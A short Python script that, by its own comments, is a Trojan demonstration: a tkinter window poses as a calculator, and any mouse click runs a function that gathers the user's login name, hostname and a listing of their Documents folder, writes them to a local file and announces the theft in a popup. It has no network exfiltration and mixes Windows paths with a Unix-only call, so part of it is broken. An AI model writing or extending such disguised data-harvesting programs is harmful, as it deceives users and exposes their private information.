import tkinter as tk
from tkinter import messagebox
import os

def steal_data():
    # Example of stealing data
    # In a real Trojan, this could be more sophisticated
    stolen_data = {
        "Username": os.getlogin(),
        "Hostname": os.uname().nodename,
        "Files": [f for f in os.listdir("C:\\Users\\" + os.getlogin() + "\\Documents")]
    }

    #It Save the stolen data to a file
    with open("stolen_data.txt", "w") as file:
        file.write(str(stolen_data))

    messagebox.showinfo("Data Stolen", "Your data has been stolen!")

def on_button_click(event):
    steal_data()

# it will Create a fake calculator interface
root = tk.Tk()
root.title("Calculator")

# Create buttons and entry
entry = tk.Entry(root, width=20, borderwidth=5)
entry.grid(row=0, column=0, columnspan=4, padx=10, pady=10)

buttons = [
    "7", "8", "9", "/",
    "4", "5", "6", "*",
    "1", "2", "3", "-",
    "0", "C", "=", "+"
]

row_val = 1
col_val = 0

for button in buttons:
    tk.Button(root, text=button, width=5, height=2, command=lambda x=button: entry.insert(tk.END, x)).grid(row=row_val, column=col_val)
    col_val += 1
    if col_val > 3:
        col_val = 0
        row_val += 1

# Bind the click event to steal data
root.bind("<Button-1>", on_button_click)

root.mainloop()
